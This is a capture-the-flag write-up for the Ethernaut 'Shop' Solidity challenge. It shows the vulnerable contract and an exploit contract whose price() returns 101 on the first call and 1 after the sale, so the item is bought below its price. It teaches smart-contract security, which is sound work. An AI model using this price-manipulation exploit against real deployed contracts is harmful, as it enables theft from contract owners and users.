# Shop

Сan you get the item from the shop for less than the price asked?

Things that might help:
- Shop expects to be used from a Buyer
- Understanding restrictions of view functions


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


```

## Solution


Create the Buyer contract as following. 
```
contract Buyer {
  
  Shop shop;
  function price() external view returns (uint){
    if(shop.isSold()){
      return 1;
    }
    return 101;
  }

  function callBuy(address _shop) public {
    shop = Shop(_shop);
    shop.buy(); 
  }
}

```

When the price function is called for the first time
- `if (_buyer.price() >= price && !isSold)`

 it will return 101 and when it is called for the second time 
 
 - `price = _buyer.price();`

 it will return 1. Hence we will be able to buy the item for lesser price.

### Hint from Ethernaut

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.